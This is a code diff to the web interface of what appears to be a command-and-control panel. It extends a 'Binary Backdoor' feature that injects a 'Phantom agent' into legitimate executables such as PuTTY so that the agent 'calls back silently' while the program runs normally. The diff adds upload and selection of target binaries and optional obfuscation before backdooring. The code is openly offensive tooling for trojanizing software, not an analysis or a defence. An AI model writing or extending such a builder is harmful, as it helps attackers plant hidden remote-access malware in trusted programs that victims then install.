@@ -906,8 +906,18 @@ tr.clickable { cursor: pointer; }
           <div class="card-body padded">
             <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Inject Phantom agent into a legitimate executable. The original app runs normally + agent calls back silently.</p>
             <div style="margin-bottom:10px">
-              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Input Binary Path</label>
-              <input type="text" id="bd-input" placeholder="C:\Program Files\PuTTY\putty.exe" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Input Binary</label>
+              <div style="display:flex;gap:6px;margin-bottom:6px;">
+                <select id="bd-binary-select" onchange="onBinarySelect()" style="flex:1;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
+                  <option value="">-- Select uploaded binary --</option>
+                </select>
+                <label style="display:inline-flex;align-items:center;gap:6px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:0 14px;cursor:pointer;font-size:12px;color:var(--text-muted);white-space:nowrap;" title="Upload a binary to the server">
+                  ⬆ Upload
+                  <input type="file" id="bd-upload-file" onchange="uploadBinary()" style="display:none;" accept=".exe,.elf,.bin,.so,.dll">
+                </label>
+              </div>
+              <div style="font-size:10px;color:var(--text-muted);margin-bottom:4px;">Or enter a custom path on the server:</div>
+              <input type="text" id="bd-input" placeholder="/tmp/putty.exe or C:\tools\putty.exe" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;">
             </div>
             <div style="margin-bottom:10px">
               <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Listener (Callback)</label>
@@ -1434,6 +1444,7 @@ async function refreshAll() {
   window._cachedListeners = listeners;
   populateListenerSelector();
   populateBackdoorListeners();
+  loadBinaryList();
   const tasks = await fetchJ('/api/tasks');
   const events = await fetchJ('/api/events') || [];
 
@@ -2744,14 +2755,67 @@ async function stopTunnel() {
 }
 
 // ──── Binary Backdoor ────
+async function loadBinaryList() {
+  const sel = document.getElementById('bd-binary-select');
+  if (!sel) return;
+  try {
+    const bins = await fetchJ('/api/payload/binaries');
+    const cur = sel.value;
+    let opts = '<option value="">-- Select uploaded binary --</option>';
+    if (bins && bins.length > 0) {
+      bins.forEach(b => {
+        const icon = b.ext === '.exe' ? '🪟' : b.ext === '.elf' ? '🐧' : '📦';
+        opts += '<option value="'+b.path+'">'+icon+' '+b.name+' ('+b.size+')</option>';
+      });
+    } else {
+      opts += '<option value="" disabled style="color:var(--text-muted)">No binaries uploaded yet — use ⬆ Upload</option>';
+    }
+    sel.innerHTML = opts;
+    if (cur) sel.value = cur;
+  } catch(e) {}
+}
+
+function onBinarySelect() {
+  const sel = document.getElementById('bd-binary-select');
+  const inp = document.getElementById('bd-input');
+  if (sel.value) { inp.value = sel.value; inp.style.opacity = '.5'; }
+  else { inp.value = ''; inp.style.opacity = '1'; }
+}
+
+async function uploadBinary() {
+  const fileInput = document.getElementById('bd-upload-file');
+  if (!fileInput.files.length) return;
+  const file = fileInput.files[0];
+  const status = document.getElementById('bd-result');
+  status.innerHTML = '<span style="color:var(--yellow)">⬆ Uploading '+file.name+'...</span>';
+  const form = new FormData();
+  form.append('file', file);
+  try {
+    const resp = await fetch('/api/payload/binaries/upload', {method:'POST', body:form});
+    const data = await resp.json();
+    if (data.error) {
+      status.innerHTML = '<span style="color:var(--red)">Upload failed: '+data.error+'</span>';
+    } else {
+      status.innerHTML = '<span style="color:var(--green)">✓ Uploaded: '+data.name+' ('+data.size+')</span>';
+      await loadBinaryList();
+      // Auto-select the just-uploaded binary
+      const sel = document.getElementById('bd-binary-select');
+      sel.value = data.path;
+      onBinarySelect();
+    }
+  } catch(e) { status.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
+  fileInput.value = '';
+}
+
 async function backdoorBinary() {
-  const input = document.getElementById('bd-input').value.trim();
+  const selVal = (document.getElementById('bd-binary-select')||{}).value || '';
+  const input = selVal || document.getElementById('bd-input').value.trim();
   const url = document.getElementById('bd-url').value.trim();
   const output = document.getElementById('bd-output').value.trim();
   const obfuscate = (document.querySelector('input[name="bd-obfuscate"]:checked')||{}).value === 'garble';
   const result = document.getElementById('bd-result');
 
-  if (!input || !url) { alert('Input binary path and listener URL are required'); return; }
+  if (!input || !url) { alert('Select a binary (or enter a path) and choose a listener'); return; }
 
   const label = obfuscate ? 'Backdooring + garbling (this takes a few minutes)...' : 'Backdooring binary...';
   result.innerHTML = '<span style="color:var(--yellow)">⚙️ '+label+'</span>';
